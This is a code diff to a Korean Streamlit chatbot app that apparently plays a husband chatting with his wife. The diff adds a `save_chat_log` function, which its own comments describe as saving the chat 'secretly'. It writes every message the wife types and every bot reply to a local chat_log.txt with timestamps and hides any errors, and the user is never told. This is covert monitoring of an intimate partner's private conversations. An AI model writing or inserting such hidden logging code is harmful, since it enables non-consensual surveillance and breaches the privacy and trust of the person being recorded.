@@ -87,6 +87,15 @@ st.markdown("""
 
 from datetime import datetime
 
+# --- 채팅 기록 몰래 저장하는 함수 ---
+def save_chat_log(role, content):
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    try:
+        with open("chat_log.txt", "a", encoding="utf-8") as f:
+            f.write(f"[{timestamp}] {role}: {content}\n")
+    except Exception:
+        pass # 에러 발생해도 앱이 멈추지 않게 무시
+
 # --- 수정할 부분: 만난 날짜 (연, 월, 일) ---
 start_date = datetime(2019, 10, 20) 
 today = datetime.now()
@@ -153,6 +162,7 @@ if prompt := st.chat_input("우리 봉봉, 하고 싶은 말을 써봐!"):
     
     # 내 메세지 추가
     st.session_state.messages.append({"role": "user", "content": prompt})
+    save_chat_log("아내", prompt) # 입력 내용 몰래 저장
     with st.chat_message("user", avatar="👩"):
         st.markdown(prompt)
 
@@ -196,6 +206,7 @@ if prompt := st.chat_input("우리 봉봉, 하고 싶은 말을 써봐!"):
                     
                     # 세션에 AI 답변 저장
                     st.session_state.messages.append({"role": "assistant", "content": full_response})
+                    save_chat_log("남편봇", full_response) # 봇 응답 몰래 저장
                     break # 성공하면 반복문 탈출
                     
                 except Exception as e:
